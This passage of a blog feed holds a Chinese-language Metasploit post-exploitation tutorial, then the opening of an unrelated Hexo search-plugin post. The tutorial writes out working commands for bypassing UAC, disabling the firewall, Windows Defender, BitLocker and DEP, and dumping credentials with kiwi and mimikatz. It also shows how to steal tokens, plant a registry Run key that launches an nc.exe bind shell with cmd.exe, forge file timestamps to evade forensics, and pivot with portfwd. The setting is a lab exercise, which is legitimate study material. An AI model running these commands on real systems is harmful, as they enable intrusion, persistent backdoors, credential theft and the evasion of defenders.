class="line">    -p &lt;opt&gt;  自动播放捕获到的音频，默认：true</span><br><span class="line">webcam_chat    开启一个视频聊天</span><br><span class="line">webcam_list    显示设备列表</span><br><span class="line">webcam_snap    从指定的设备拍照截图</span><br><span class="line">webcam_stream  从指定的webcam播放视频流</span><br><span class="line">权限提升</span><br><span class="line">======================</span><br><span class="line">getsystem     尝试提升用户权限</span><br><span class="line">密码数据库</span><br><span class="line">================================</span><br><span class="line">hashdump      下载密码哈希值（sam库）</span><br><span class="line">文件属性</span><br><span class="line">timestomp     修改文件的属性（后续发）</span><br></pre></td></tr></table></figure><h2 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h2><hr><h3 id="admin绕过UAC"><a href="#admin绕过UAC" class="headerlink" title="admin绕过UAC"></a>admin绕过UAC</h3><p>Win7及以上默认都会开启用户访问控制，即使得到administrator权限也不能直接提权到system（如下图），所以要先绕过UAC，下面是方法，前提是已经有一个administrator的shell了。<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571991978047/0" class="lozad"><br>0X01 use exploit/windows/local/ask<br>设置一个欺骗性的名字，然后在受害主机弹出确认框，若对方确认则成功<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992016438/0" class="lozad"><br>0X02 use exploit/windows/local/bypassuac_vbs<br>也是需要用户确认，通过vbs来绕过，生成了清理文件可以手动点击清理<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992048300/0" class="lozad"><br>目标会弹出确认框，需要点击确认才行<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992073791/0" class="lozad"><br>0X03 use exploit/windows/local/bypassuac</p><h3 id="低权限system提权"><a href="#低权限system提权" class="headerlink" title="低权限system提权"></a>低权限system提权</h3><p>如题，需要一个低权限的shell，然后需要利用目标存在的漏洞，可在<br>Exploit/windows/local/目录下搜索能够提权的模块。</p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>现在及之后命令都是在system权限下进行的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992141542/0" class="lozad"><br>不过这样隐蔽性不好，可以直接添加一条规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd -i -H</span><br><span class="line">C:\windows\system32&gt;netsh firewall show opmode</span><br><span class="line">C:\windows\system32&gt;netsh firewall add portopening TCP 444 &quot;hia-hia-hia&quot; ENABLE ALL</span><br></pre></td></tr></table></figure><h3 id="关闭windefend"><a href="#关闭windefend" class="headerlink" title="关闭windefend"></a>关闭windefend</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop windefend（就像很普通的关闭服务）</span><br></pre></td></tr></table></figure><h3 id="关闭bitlocker"><a href="#关闭bitlocker" class="headerlink" title="关闭bitlocker"></a>关闭bitlocker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">manage-bde -status E: </span><br><span class="line">manage-bde -off E:（需要在受害者已经解锁后才能去除加密，如下图）</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992266102/0" class="lozad"><br><img alt="img" data-src="https://blog.betamao.me/image/2017-09-01-09-00-55.png" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992323617/0" class="lozad"></p><h3 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>（看到最后一句提供了关闭的rc文件）<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993706465/0" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e run </span><br><span class="line">getgui -u username -p passwd</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992397329/0" class="lozad"></p><h3 id="关闭DEP"><a href="#关闭DEP" class="headerlink" title="关闭DEP"></a>关闭DEP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992447186/0" class="lozad"></p><h3 id="杀死防病毒软件"><a href="#杀死防病毒软件" class="headerlink" title="杀死防病毒软件"></a>杀死防病毒软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav(已经失效)</span><br></pre></td></tr></table></figure><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><p>tokens：<br>用户每次登陆，账号绑定临时的token<br>访问资源时提交token进行身份验证，类似于web cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delegate token:交互登陆会话</span><br><span class="line">impersonate token：非交互登陆会话（他们两者权限是一样的，但是只有delegate token可以交互）</span><br><span class="line">delegate token账号注销后变为impersonate token，权限依然有效</span><br></pre></td></tr></table></figure><h3 id="incognito"><a href="#incognito" class="headerlink" title="incognito"></a>incognito</h3><p>独立功能的软件，被msf集成在meterpreter中<br>无需密码破解或获取密码hash，窃取token将自己伪装成其他用户<br>尤其适用于与环境下提权渗透多操作系统，下面的模块中含有相关技术<br>其他模块<br>使用load可以看到存在插件<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992486295/0" class="lozad"></p><h3 id="espia"><a href="#espia" class="headerlink" title="espia"></a>espia</h3><p>screengrab用来截屏。。。</p><h3 id="lanattacks"><a href="#lanattacks" class="headerlink" title="lanattacks"></a>lanattacks</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Lanattacks: DHCP Commands</span><br><span class="line">=========================</span><br><span class="line">    dhcp_load_options  载入选项</span><br><span class="line">    dhcp_log           记录</span><br><span class="line">    dhcp_reset         重置</span><br><span class="line">    dhcp_set_option    设置</span><br><span class="line">    dhcp_start         开始</span><br><span class="line">    dhcp_stop          停止</span><br><span class="line">Lanattacks: TFTP Commands</span><br><span class="line">=========================</span><br><span class="line">    tftp_add_file  像tftp添加文件</span><br><span class="line">    tftp_reset     重置</span><br><span class="line">    tftp_start     开始</span><br><span class="line">tftp_stop      停止</span><br></pre></td></tr></table></figure><h3 id="extapi"><a href="#extapi" class="headerlink" title="extapi"></a>extapi</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Extapi: Window Management Commands</span><br><span class="line">==================================</span><br><span class="line">    window_enum   枚举所有已经打开的窗口</span><br><span class="line">Extapi: Service Management Commands</span><br><span class="line">===================================</span><br><span class="line">    service_control  控制服务 (start/pause/resume/stop/restart)</span><br><span class="line">    service_enum    枚举所有服务</span><br><span class="line">    service_query    查询指定服务细节</span><br><span class="line">Extapi: Clipboard Management Commands</span><br><span class="line">=====================================</span><br><span class="line">    clipboard_get_data       读取剪贴板内容</span><br><span class="line">    clipboard_monitor_dump   下载监听的内容</span><br><span class="line">    clipboard_monitor_pause   暂停监听</span><br><span class="line">    clipboard_monitor_purge   删除已经监听的数据</span><br><span class="line">    clipboard_monitor_resume  继续监听</span><br><span class="line">    clipboard_monitor_start   监听剪贴板</span><br><span class="line">    clipboard_monitor_stop    停止监听</span><br><span class="line">    clipboard_set_text        向目标剪贴板写入文本（似乎并不好用）</span><br><span class="line">Extapi: ADSI Management Commands</span><br><span class="line">================================</span><br><span class="line">    adsi_computer_enum           枚举所有指定域的电脑</span><br><span class="line">    adsi_dc_enum                枚举所有指定域的域控制器</span><br><span class="line">    adsi_domain_query            Enumerate all objects on the specified domain that match a filter.</span><br><span class="line">    adsi_group_enum              枚举所有指定域的组</span><br><span class="line">    adsi_nested_group_user_enum  Recursively enumerate users who are effectively members of the group specified.</span><br><span class="line">    adsi_user_enum               枚举所有指定域的用户</span><br><span class="line">Extapi: WMI Querying Commands</span><br><span class="line">=============================</span><br><span class="line">wmi_query     Perform a generic WMI query and return the results</span><br></pre></td></tr></table></figure><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line">    creds_all              Retrieve all credentials         #实在不行还可以用模块钓鱼获取</span><br><span class="line">    creds_kerberos         Retrieve Kerberos creds</span><br><span class="line">    creds_livessp          Retrieve LiveSSP creds</span><br><span class="line">    creds_msv              Retrieve LM/NTLM creds (hashes)</span><br><span class="line">    creds_ssp              Retrieve SSP creds</span><br><span class="line">    creds_tspkg            Retrieve TsPkg creds</span><br><span class="line">    creds_wdigest          Retrieve WDigest creds</span><br><span class="line">    golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">    kerberos_ticket_list   List all kerberos tickets</span><br><span class="line">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">    kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">    lsa_dump             下载LSA secrets</span><br><span class="line">    wifi_list              列出WiFi密码</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992515584/0" class="lozad"></p><h3 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Incognito Commands</span><br><span class="line">==================</span><br><span class="line">    add_group_user       尝试用所有的token去添加一个用户到域</span><br><span class="line">    add_localgroup_user  尝试用所有的token去添加一个用户到本地</span><br><span class="line">    add_user            尝试用所有token去添加一个用户</span><br><span class="line">    impersonate_token    使用Impersonate token伪装身份</span><br><span class="line">    list_tokens           列出存在的token</span><br><span class="line">    snarf_hashes         Snarf challenge/response hashes for every token</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992544776/0" class="lozad"><br><img alt="img" data-src="https://blog.betamao.me/image/2017-09-01-09-06-16.png" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992599192/0" class="lozad"></p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz Commands</span><br><span class="line">    kerberos          Attempt to retrieve kerberos creds</span><br><span class="line">    livessp           Attempt to retrieve livessp creds</span><br><span class="line">    mimikatz_command  Run a custom command</span><br><span class="line">    msv               Attempt to retrieve msv creds (hashes)</span><br><span class="line">    ssp               Attempt to retrieve ssp creds</span><br><span class="line">    tspkg             Attempt to retrieve tspkg creds</span><br><span class="line">    wdigest           Attempt to retrieve wdigest creds</span><br></pre></td></tr></table></figure><h3 id="sniffer"><a href="#sniffer" class="headerlink" title="sniffer"></a>sniffer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Sniffer Commands</span><br><span class="line">    sniffer_dump      下载捕获的包</span><br><span class="line">    sniffer_interfaces   枚举所有可用网络接口</span><br><span class="line">    sniffer_release     释放捕获的包</span><br><span class="line">    sniffer_start       开始</span><br><span class="line">    sniffer_stats       状态</span><br><span class="line">    sniffer_stop        停止捕获包</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python Commands</span><br><span class="line">===============</span><br><span class="line">    python_execute  执行一串Python命令</span><br><span class="line">    python_import   导入运行脚本或模块</span><br><span class="line">    python_reset    重启解释器</span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Powershell Commands</span><br><span class="line">===================</span><br><span class="line">    powershell_execute  执行一串powershell命令</span><br><span class="line">    powershell_import   导入ps1文件或是 .NET 组装的 DLL</span><br><span class="line">    powershell_shell    进入交互式powershell</span><br></pre></td></tr></table></figure><h3 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h3><p>使用注册表编辑器：<br>Windows几乎所有的设置都是写在注册表中的，所以注册表工具异常强大，这里以安装一个开机自启动执行监听并返回shell的nc为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg </span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -d &lt;opt&gt;  设置键值.</span><br><span class="line">    -k &lt;opt&gt;  指定键路径(E.g. HKLM\Software\Foo).</span><br><span class="line">    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t &lt;opt&gt;  设置键类型(E.g. REG_SZ).</span><br><span class="line">    -v &lt;opt&gt;  设置键名</span><br><span class="line">    -w        Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line">    enumkey枚举一个键的值 [-k &lt;key&gt;]</span><br><span class="line">    createkey创建一个键  [-k &lt;key&gt;]</span><br><span class="line">    deletekey删除一个键  [-k &lt;key&gt;]</span><br><span class="line">    queryclass 查询键的class [-k &lt;key&gt;]</span><br><span class="line">    setval设置一个子键 [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]</span><br><span class="line">    deleteval删除一个子键 [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">queryval查询一个子键 [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure><p>补充：nc.exe：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen for inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -d              从控制台分离后悄悄执行</span><br><span class="line">        -e prog         绑定一个程序到监听端口[dangerous!!]</span><br><span class="line">        -i secs         间隔时间</span><br><span class="line">        -l              监听模式</span><br><span class="line">        -L              监听且在连接断开后，继续监听</span><br><span class="line">        -n              numeric-only IP addresses, no DNS</span><br><span class="line">        -o file         以16进制下载数据</span><br><span class="line">        -p port         本地端口号</span><br><span class="line">        -r              使用随机的本地/远程端口</span><br><span class="line">        -s addr         源地址</span><br><span class="line">        -t              回应Telnet协商</span><br><span class="line">        -u              UDP模式</span><br><span class="line">        -v              详细信息</span><br><span class="line">        -z              端口扫描</span><br><span class="line">        port numbers can be individual or ranges: m-n [inclusive]</span><br></pre></td></tr></table></figure><p>查询这个键：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br></pre></td></tr></table></figure><p>设置子健：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\nc.exe -Ldp 444 -e C:\\windows\system32\cmd.exe&apos;</span><br></pre></td></tr></table></figure><p>查询子健：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992634302/0" class="lozad"><br>Win7上查看下：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992673185/0" class="lozad"></p><h3 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Usage: execute -f file [options]</span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line">OPTIONS:</span><br><span class="line">    -H        创建隐藏的进程</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  要执行的命令</span><br><span class="line">    -i        交互式执行</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        从内存中执行</span><br><span class="line">    -s &lt;opt&gt;  以指定session的用户身份来执行该命令</span><br><span class="line">    -t        以impersonated token身份来执行该命令</span><br><span class="line">Usage: execute -f file [options]Executes a command on the remote machine.OPTIONS:    -H        创建隐藏的进程    -a &lt;opt&gt;  The arguments to pass to the command.    -c        Channelized I/O (required for interaction).    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.    -f &lt;opt&gt;  要执行的命令    -i        交互式执行    -k        Execute process on the meterpreters current desktop    -m        从内存中执行    -s &lt;opt&gt;  以指定session的用户身份来执行该命令    -t        以impersonated token身份来执行该命令</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571992730166/0" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992980934/0" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992980934/0" class="lozad"></p><p>检查成功：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993099265/0" class="lozad"></p><h2 id="timestomp"><a href="#timestomp" class="headerlink" title="timestomp"></a>timestomp</h2><p>说起文件时间就是一个坑，第一次往学长靶机放shell就是因为这个被秒找到。。。<br><em>前言：</em><br>文件系统访问会留下痕迹，这是电子取证重点关注的地方，渗透测试和攻击者往往希望销毁文件系统访问痕迹，但是鬼知道有没有彻底销毁，所以最好的避免被电子取证发现的方法就是不要碰文件系统，而这也是meterpreter的先天优势所在（完全基于内存），要是碰了该咋办呢？<br><em>不搭后语：</em><br>mac时间（modified/accessed/changed）<br>可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls –l hia.exe</span><br><span class="line">ls -l --time=atime hia.exe</span><br><span class="line">ls –l –time=ctime hia.exe</span><br></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stat hia.exe</span><br></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp </span><br><span class="line">Usage: timestomp OPTIONS file_path</span><br><span class="line">OPTIONS:</span><br><span class="line">    -b        删除mace时间戳</span><br><span class="line">    -a &lt;opt&gt;  设置atime</span><br><span class="line">    -c &lt;opt&gt;  设置ctime</span><br><span class="line">-m &lt;opt&gt;  设置mtime</span><br><span class="line">    -e &lt;opt&gt;  设置etime</span><br><span class="line">    -z &lt;opt&gt;  设置所有时间</span><br><span class="line">    -f &lt;opt&gt;  复制指定文件的时间戳</span><br><span class="line">    -r        对一个目录递归设置mace时间戳</span><br><span class="line">    -v        显示mace时间戳</span><br></pre></td></tr></table></figure><p>补充：mace中的e:mft entry<br>mft：ntfs文件系统的主文件分配表 master file table<br>通常1024字节或2个硬盘扇区，其中存放多项entry信息<br>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）<br>更多信息可研究文件系统取证分析技术<br>文字不够图来凑：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993159081/0" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993190082/0" class="lozad"></p><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h3><p>实验环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Monowall 192.168.79.135/10.21.11.1    边界防火墙</span><br><span class="line">Win7 10.21.11.2        内网主机，执行木马反弹shell，用来做跳板</span><br><span class="line">Winxp    10.21.11.3    内网主机，被通过跳板攻击</span><br><span class="line">Kali2016.2 192.168.79.130            攻击</span><br></pre></td></tr></table></figure><h4 id="使用跳板"><a href="#使用跳板" class="headerlink" title="使用跳板"></a>使用跳板</h4><p>配置防火墙规则，开心就好<br>取得win7shell，双击就好<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1440820217_1571993365565/0" class="lozad"><br>查看IP：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571993390282/0" class="lozad"><br>使用跳板：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993503098/0" class="lozad"><br>扫描内网：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993531860/0" class="lozad"><br>（速度太慢了，就只指定了一台主机）<br>入侵内网主机：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993560615/0" class="lozad"><br>（恶俗的08067…）</p><h4 id="使用端口转发："><a href="#使用端口转发：" class="headerlink" title="使用端口转发："></a>使用端口转发：</h4><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -L &lt;opt&gt;  Forward: 本地监听主机</span><br><span class="line">  Remote: 要连接的本地主机</span><br><span class="line">    -R        表明是个反弹的端口转发</span><br><span class="line">    -l &lt;opt&gt;  Forward: 本地监听端口</span><br><span class="line">  Reverse: 本地主机去连接的端口</span><br><span class="line">    -p &lt;opt&gt;  Forward: 要连接到的远程主机端口</span><br><span class="line">  Reverse: 远程主机监听的端口</span><br><span class="line">    -r &lt;opt&gt;  Forward: 远程主机</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.79.130 -l 54321  -r 10.21.11.3 -p 445</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571993586655/0" class="lozad"><br>后来：<br>使用跳板的路由配置只在msfconsole内部生效，似乎db_nmap无效<br>使用跳板时若跳板机防火墙规则不允许出站可以使用之前的方法修改规则<br>若本机自己处于内网，可以使用动态域名内网穿透和公网主机+隧道的方式</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushm</span><br><span class="line">popm        #可以把模块及其参数用栈保存</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Metasploit" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/Metasploit/"/>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
    
      <category term="Metasploit" scheme="https://gz1903.github.io/tags/Metasploit/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-Algoliasearch</title>
    <link href="https://gz1903.github.io/2019/10/19/Hexo-Algoliasearch/"/>
    <id>https://gz1903.github.io/2019/10/19/Hexo-Algoliasearch/</id>
    <published>2019-10-19T03:40:31.000Z</published>
    <updated>2019-10-28T03:42:50.668Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> <strong>一个在Algolia上为Hexo博客的帖子编制索引的插件 ，增加搜索功能。</strong></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_290186585_1571456373974/0" class="lozad"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-algoliasearch --save</span><br></pre></td></tr></table></figure><p> <strong>Hexo自动检测到所有插件 ， 如果不是这种情况，请在您的<code>_config.yml</code>文件中注册插件：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugins:</span><br><span class="line">  - hexo-algoliasearch</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p> 